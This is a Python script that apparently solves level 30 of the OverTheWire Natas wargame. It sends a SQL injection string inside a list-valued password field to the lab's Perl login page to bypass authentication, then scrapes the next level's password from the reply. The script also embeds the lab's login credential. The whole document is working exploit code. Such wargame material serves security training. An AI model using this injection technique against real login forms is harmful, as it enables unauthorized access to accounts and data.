#! /usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = "http://natas30.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas30","wie9iexae0Daihohv8vuu3cei9wahf0e")

data = {'username':'natas30','password':["'yuval' or 1=1-- ",4]}
response = requests.post(url,auth=auth,data=data)
soup = BeautifulSoup(response.text,'html.parser')
password = str(soup.find("div",{"id":"content"})).split("<br/>")[4].split("<")[0].split("natas31")
print(f"username is: natas31 and password is: {password[1]}")